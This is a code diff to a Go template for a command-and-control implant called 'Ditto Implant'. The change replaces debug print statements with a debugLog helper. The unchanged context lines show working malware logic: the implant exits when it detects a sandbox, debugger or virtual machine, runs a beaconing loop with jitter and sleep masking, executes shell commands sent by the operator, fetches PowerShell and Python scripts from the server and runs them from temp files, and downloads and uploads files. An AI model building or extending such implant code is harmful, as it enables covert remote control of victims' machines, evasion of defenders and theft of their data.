@@ -574,16 +574,16 @@ var (
 func main() {
 	{{if .Debug}}
 	// DEBUG MODE: Console window visible for troubleshooting
-	fmt.Println("[DEBUG] Ditto Implant Starting...")
-	fmt.Printf("[DEBUG] Callback URL: %s\n", callbackURL)
-	fmt.Printf("[DEBUG] Delay: %d seconds\n", delay)
-	fmt.Printf("[DEBUG] Jitter: %.2f%%\n", jitter*100.0)
+	debugLog("Ditto Implant Starting...")
+	debugLog("Callback URL: %s", callbackURL)
+	debugLog("Delay: %d seconds", delay)
+	debugLog("Jitter: %.2f%%", jitter*100.0)
 	{{end}}
 	
 	// Avoid detection
 	if runtime.GOOS != "windows" {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] ERROR: Not running on Windows, exiting")
+		debugLog("ERROR: Not running on Windows, exiting")
 		{{end}}
 		os.Exit(1)
 	}
@@ -592,7 +592,7 @@ func main() {
 	// Sandbox detection
 	if checkSandbox() {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] Sandbox detected, exiting")
+		debugLog("Sandbox detected, exiting")
 		{{end}}
 		os.Exit(0)
 	}
@@ -602,7 +602,7 @@ func main() {
 	// Debugger detection
 	if checkDebugger() {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] Debugger detected, exiting")
+		debugLog("Debugger detected, exiting")
 		{{end}}
 		os.Exit(0)
 	}
@@ -612,14 +612,14 @@ func main() {
 	// VM detection
 	if checkVM() {
 		{{if .Debug}}
-		fmt.Println("[DEBUG] VM detected, exiting")
+		debugLog("VM detected, exiting")
 		{{end}}
 		os.Exit(0)
 	}
 	{{end}}
 	
 	{{if .Debug}}
-	fmt.Println("[DEBUG] Starting beacon loop...")
+	debugLog("Starting beacon loop...")
 	{{end}}
 	
 	// Beacon loop with adaptive jitter
@@ -635,7 +635,7 @@ func main() {
 		}
 		sleepDuration := time.Duration(sleepSeconds * float64(time.Second))
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Sleeping for %.2fs before next beacon (delay=%.2f, jitter=%.2f%%)\n", sleepSeconds, currentDelay, currentJitter*100)
+		debugLog("Sleeping for %.2fs before next beacon (delay=%.2f, jitter=%.2f%%)", sleepSeconds, currentDelay, currentJitter*100)
 		{{end}}
 		{{if and .Evasion .Evasion.SleepMask}}
 		// Sleep mask evasion
@@ -1039,7 +1039,7 @@ func executeTask(task map[string]interface{}) {
 
 func executeShellCommand(taskID, cmd string) {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Executing shell command: id=%s, cmd=%s\n", taskID, cmd)
+	debugLog("Executing shell command: id=%s, cmd=%s", taskID, cmd)
 	{{end}}
 	
 	// Execute shell command and send result back
@@ -1049,7 +1049,7 @@ func executeShellCommand(taskID, cmd string) {
 
 func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Executing module: id=%s, module=%s\n", taskID, moduleID)
+	debugLog("Executing module: id=%s, module=%s", taskID, moduleID)
 	{{end}}
 	
 	// Extract parameters from task
@@ -1076,9 +1076,9 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		isPython := strings.Contains(moduleID, "python/")
 		{{if .Debug}}
 		if isPowerShell {
-			fmt.Printf("[DEBUG] PowerShell module detected, fetching script from server\n")
+			debugLog("PowerShell module detected, fetching script from server")
 		} else if isPython {
-			fmt.Printf("[DEBUG] Python module detected, fetching script from server\n")
+			debugLog("Python module detected, fetching script from server")
 		}
 		{{end}}
 		
@@ -1143,7 +1143,7 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		}
 		
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Writing %s script to temp file: %s\n", strings.ToUpper(fileExt[1:]), tmpFile)
+		debugLog("Writing %s script to temp file: %s", strings.ToUpper(fileExt[1:]), tmpFile)
 		{{end}}
 		
 		// Write script to temp file
@@ -1156,7 +1156,7 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		defer func() {
 			os.Remove(tmpFile)
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] Removed temp file: %s\n", tmpFile)
+			debugLog("Removed temp file: %s", tmpFile)
 			{{end}}
 		}()
 		
@@ -1320,12 +1320,12 @@ func executeCommand(cmd string) string {
 	if err != nil {
 		result = fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Command error: %v\n", err)
+		debugLog("Command error: %v", err)
 		{{end}}
 	} else {
 		result = string(output)
 		{{if .Debug}}
-		fmt.Printf("[DEBUG] Command output length: %d bytes\n", len(result))
+		debugLog("Command output length: %d bytes", len(result))
 		{{end}}
 	}
 	return result
@@ -1333,7 +1333,7 @@ func executeCommand(cmd string) string {
 
 func downloadFile(taskID, path string) {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Downloading file: id=%s, path=%s\n", taskID, path)
+	debugLog("Downloading file: id=%s, path=%s", taskID, path)
 	{{end}}
 	
 	// Download file and send back
@@ -1347,7 +1347,7 @@ func downloadFile(taskID, path string) {
 
 func uploadFile(taskID, path, data string) {
 	{{if .Debug}}
-	fmt.Printf("[DEBUG] Uploading file: id=%s, path=%s\n", taskID, path)
+	debugLog("Uploading file: id=%s, path=%s", taskID, path)
 	{{end}}
 	
 	// Upload file to disk
